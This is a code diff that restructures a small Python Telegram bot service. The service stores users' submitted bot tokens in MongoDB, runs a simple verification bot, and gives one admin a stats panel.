@@ -4,110 +4,106 @@ import requests
 from telebot.types import ReplyKeyboardMarkup
 from pymongo import MongoClient
 
-# ================= MONGODB =================
+# ================= ENV =================
+
+MAIN_TOKEN = os.getenv("MAIN_BOT_TOKEN")
+VERIFY_TOKEN = os.getenv("VERIFY_BOT_TOKEN")
+ADMIN_TOKEN = os.getenv("ADMIN_BOT_TOKEN")
+
+ADMIN_ID = int(os.getenv("ADMIN_ID"))
 
 MONGO_URL = os.getenv("MONGO_URL")
+
+# ================= MONGO =================
+
 client = MongoClient(MONGO_URL)
 
-db = client["telegram_system"]
+db = client["verify_system"]
 
-bots_collection = db["bots"]
-users_collection = db["users"]
+bots_db = db["bots"]
+users_db = db["users"]
+stats_db = db["stats"]
 
-# ================= TELEGRAM =================
+# ================= BOTS =================
 
-TOKEN = os.getenv("MAIN_BOT_TOKEN")
-
-bot = telebot.TeleBot(TOKEN)
+main_bot = telebot.TeleBot(MAIN_TOKEN)
+verify_bot = telebot.TeleBot(VERIFY_TOKEN)
+admin_bot = telebot.TeleBot(ADMIN_TOKEN)
 
 user_state = {}
 
 # ================= SAVE USER =================
 
-def save_user(user_id):
+def save_user(uid):
 
-    if not users_collection.find_one({"user_id": user_id}):
+    if not users_db.find_one({"user_id": uid}):
 
-        users_collection.insert_one({
-            "user_id": user_id
+        users_db.insert_one({
+            "user_id": uid
         })
-
 
 # ================= START =================
 
-@bot.message_handler(commands=['start'])
+@main_bot.message_handler(commands=["start"])
 def start(message):
 
-    user_id = message.from_user.id
+    uid = message.from_user.id
 
-    save_user(user_id)
+    save_user(uid)
 
     kb = ReplyKeyboardMarkup(resize_keyboard=True)
 
-    kb.add("➕ Add Bot", "🤖 My Bots")
+    kb.add("➕ Add Bot")
+    kb.add("🤖 My Bots")
 
-    bot.send_message(
+    main_bot.send_message(
         message.chat.id,
-        "🤖 Welcome\n\nManage your bots easily.",
+        "🤖 Verify System\n\nAdd your bot to start verification system.",
         reply_markup=kb
     )
 
-
 # ================= ADD BOT =================
 
-@bot.message_handler(func=lambda m: m.text == "➕ Add Bot")
+@main_bot.message_handler(func=lambda m: m.text == "➕ Add Bot")
 def add_bot(message):
 
     user_state[message.from_user.id] = "token"
 
-    bot.send_message(
+    main_bot.send_message(
         message.chat.id,
         "📩 Send your Bot Token"
     )
 
-
 # ================= MY BOTS =================
 
-@bot.message_handler(func=lambda m: m.text == "🤖 My Bots")
-def my_bots(message):
+@main_bot.message_handler(func=lambda m: m.text == "🤖 My Bots")
+def mybots(message):
 
-    user_id = message.from_user.id
+    uid = message.from_user.id
 
-    bots = list(
-        bots_collection.find({"owner": user_id})
-    )
-
-    if not bots:
-
-        bot.send_message(
-            message.chat.id,
-            "❌ You don't have bots."
-        )
-
-        return
-
+    bots = bots_db.find({"owner": uid})
 
     text = "🤖 Your Bots\n\n"
 
-    i = 1
+    count = 0
 
     for b in bots:
 
-        text += f"{i}. {b['username']}\n"
+        text += f"{b['username']}\n"
+        count += 1
 
-        i += 1
+    if count == 0:
 
+        text = "❌ No bots added."
 
-    bot.send_message(message.chat.id, text)
-
+    main_bot.send_message(message.chat.id, text)
 
 # ================= RECEIVE TOKEN =================
 
-@bot.message_handler(func=lambda m: m.from_user.id in user_state)
+@main_bot.message_handler(func=lambda m: m.from_user.id in user_state)
 def receive_token(message):
 
-    user_id = message.from_user.id
-
+    uid = message.from_user.id
     token = message.text.strip()
 
     try:
@@ -118,57 +114,103 @@ def receive_token(message):
 
         if not r["ok"]:
 
-            bot.send_message(
+            main_bot.send_message(
                 message.chat.id,
                 "❌ Invalid Token"
             )
 
             return
 
-
         username = "@" + r["result"]["username"]
-
 
     except:
 
-        bot.send_message(
+        main_bot.send_message(
             message.chat.id,
             "❌ Token check failed"
         )
 
         return
 
+    if bots_db.find_one({"token": token}):
 
-    if bots_collection.find_one({"token": token}):
-
-        bot.send_message(
+        main_bot.send_message(
             message.chat.id,
             "⚠️ Bot already added"
         )
 
         return
 
+    bots_db.insert_one({
 
-    bots_collection.insert_one({
-
-        "owner": user_id,
+        "owner": uid,
         "token": token,
-        "username": username
+        "username": username,
+        "verified_users": 0
 
     })
 
+    del user_state[uid]
 
-    del user_state[user_id]
-
-
-    bot.send_message(
+    main_bot.send_message(
         message.chat.id,
         f"✅ Bot Added\n\n{username}"
     )
 
+    admin_bot.send_message(
+        ADMIN_ID,
+        f"🆕 New Bot Added\n\nOwner: {uid}\nBot: {username}"
+    )
+
+# ================= VERIFY BOT =================
+
+@verify_bot.message_handler(commands=["start"])
+def verify_start(message):
+
+    uid = message.from_user.id
+
+    save_user(uid)
+
+    verify_bot.send_message(
+        message.chat.id,
+        "✅ You are verified!"
+    )
+
+# ================= ADMIN PANEL =================
+
+@admin_bot.message_handler(commands=["start"])
+def admin_start(message):
+
+    if message.from_user.id != ADMIN_ID:
+        return
+
+    users = users_db.count_documents({})
+    bots = bots_db.count_documents({})
+
+    admin_bot.send_message(
+        message.chat.id,
+        f"""
+📊 SYSTEM STATS
+
+👤 Users: {users}
+🤖 Bots: {bots}
+"""
+    )
 
 # ================= RUN =================
 
-print("Main Bot Running...")
+print("System Running...")
 
-bot.infinity_polling()
+import threading
+
+threading.Thread(
+    target=lambda: main_bot.infinity_polling(skip_pending=True)
+).start()
+
+threading.Thread(
+    target=lambda: verify_bot.infinity_polling(skip_pending=True)
+).start()
+
+threading.Thread(
+    target=lambda: admin_bot.infinity_polling(skip_pending=True)
+).start()
